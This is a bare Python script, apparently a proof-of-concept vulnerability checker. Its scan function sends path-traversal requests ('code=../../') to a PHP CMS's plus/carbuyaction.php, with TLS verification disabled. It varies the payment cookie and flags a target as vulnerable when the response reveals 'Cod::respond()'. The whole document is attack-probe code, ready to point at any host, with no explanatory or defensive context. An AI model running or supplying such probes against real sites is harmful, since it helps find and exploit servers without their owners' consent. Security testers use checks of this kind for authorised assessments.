import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"plus/carbuyaction.php?dopost=return&code=../../"
	headers={'Cookie': 'code=alipay'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+"plus/carbuyaction.php?dopost=return&code=../../"
	headers={'Cookie': 'code=cod'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Cod::respond()" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
